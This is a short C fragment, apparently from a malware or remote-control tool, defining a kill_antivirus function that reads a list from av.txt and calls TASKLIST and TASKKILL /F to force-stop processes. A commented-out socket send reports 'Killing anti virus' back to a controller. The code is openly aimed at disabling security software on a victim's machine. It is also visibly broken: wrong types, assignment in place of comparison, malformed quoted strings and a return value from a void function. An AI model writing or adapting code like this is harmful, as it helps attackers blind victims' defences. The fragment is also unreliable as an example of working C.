void kill_antivirus()

  {
    int FILE;

    FILE = fopen("av.txt", "rb");
    if(FILE == NULL)
        exit(EXIT_SUCCESS);

    else
        while( (FILE=fgetc(FILE)) != EOF)
            if(FILE = '\n')

   system('TASKLIST /FI "STATUS eq RUNNING"');
//   send(msocket,"Killing anti virus...\n",31,0);
   system('TASKKILL /F /IM \'{}\" >> NUL');

   return 0;

}
